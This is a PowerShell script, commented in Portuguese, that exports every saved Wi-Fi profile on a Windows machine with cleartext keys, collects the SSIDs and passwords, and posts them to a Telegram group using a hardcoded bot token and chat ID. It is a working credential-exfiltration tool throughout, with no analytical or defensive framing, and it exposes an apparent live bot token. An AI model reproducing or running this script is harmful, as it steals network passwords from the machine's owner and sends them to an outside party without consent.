###############################################################################################################
# Language     :  PowerShell 4.0
# Filename     :  Export-WifiProfiles-ToTelegram.ps1
# Author       :  stra, ajustado para envio via Telegram
# Description  :  Exporta perfis Wi-Fi e envia SSIDs e senhas para um grupo do Telegram.
###############################################################################################################

# Configurações do Telegram
$token = "7860371690:AAGdm52lPwtXqdDVN97SvJezXRSsbAeb5qo"
$chat_id = "-4513765520"

[CmdletBinding()]
param(
    [int]$Threads = 10
)

Begin {
    $hostname = $env:COMPUTERNAME
    $date = Get-Date -Format "yyyyMMdd"
    $outputDir = Get-Location
    $outputXmlFile = Join-Path -Path $outputDir -ChildPath "${hostname}_wifi_${date}.xml"
    $outputCsvFile = Join-Path -Path $outputDir -ChildPath "${hostname}_wifi_${date}.csv"
    $wifiProfiles = netsh wlan show profiles | Select-String -Pattern ":(.*)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    Write-Output "SSIDs encontrados:"
    $wifiProfiles
}
process {
    [System.Management.Automation.ScriptBlock]$ExportProfileScriptBlock = {
        param (
            $wifiProfile,
            $outputDir
        )
        netsh wlan export profile name="$wifiProfile" folder="$outputDir" key=clear | Out-Null
        $wifiProfile
    }

    $RunspacePool = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspacePool(1, $Threads)
    $RunspacePool.Open()
    [System.Collections.ArrayList]$Jobs = @()

    foreach ($wifiProfile in $wifiProfiles) {
        $ScriptParams = @{
            wifiProfile = $wifiProfile
            outputDir = $outputDir
        }
        $Job = [System.Management.Automation.PowerShell]::Create().AddScript($ExportProfileScriptBlock).AddParameters($ScriptParams)
        $Job.RunspacePool = $RunspacePool
        $JobObj = [pscustomobject] @{
            ProfileName = $wifiProfile
            Pipe = $Job
            Result = $Job.BeginInvoke()
        }
        [void]$Jobs.Add($JobObj)
    }

    $Jobs | ForEach-Object {
        $_.Pipe.EndInvoke($_.Result)
        $_.Pipe.Dispose()
    }
}

End {
    $combinedXml = New-Object System.Xml.XmlDocument
    $root = $combinedXml.CreateElement("WLANProfiles")
    $combinedXml.AppendChild($root)

    $retryCount = 0
    do {
        $xmlFiles = Get-ChildItem -Path $outputDir -Filter "*.xml"
        if ($xmlFiles.Count -eq $wifiProfiles.Count) {
            break
        } else {
            Start-Sleep -Seconds 1
            $retryCount++
        }
    } while ($retryCount -lt 30)

    foreach ($xmlFile in $xmlFiles) {
        $profileXml = [xml](Get-Content $xmlFile.FullName)
        $importedNode = $combinedXml.ImportNode($profileXml.WLANProfile, $true)
        $root.AppendChild($importedNode)
        Remove-Item $xmlFile.FullName
    }

    $combinedXml.Save($outputXmlFile)

    $ssidPasswordList = foreach ($profile in $combinedXml.WLANProfiles.WLANProfile) {
        $password = $profile.MSM.security.sharedKey.keyMaterial
        if (![string]::IsNullOrWhiteSpace($password)) {
            [PSCustomObject]@{
                SSID = $profile.SSIDConfig.SSID.name
                Password = $password
            }
        }
    }

    $ssidPasswordList | Export-Csv -Path $outputCsvFile -NoTypeInformation

    # Formata os SSIDs e senhas em uma mensagem para o Telegram
    $message = "Perfis Wi-Fi encontrados em $hostname:`n"
    foreach ($entry in $ssidPasswordList) {
        $message += "`nSSID: $($entry.SSID)`nSenha: $($entry.Password)`n"
    }

    # Envia os SSIDs e senhas para o grupo do Telegram
    $uri = "https://api.telegram.org/bot$token/sendMessage"
    Invoke-RestMethod -Uri $uri -Method Post -Body @{
        chat_id = $chat_id
        text = $message
    }

    Write-Output "Exportação concluída. Os dados foram enviados para o Telegram."
}
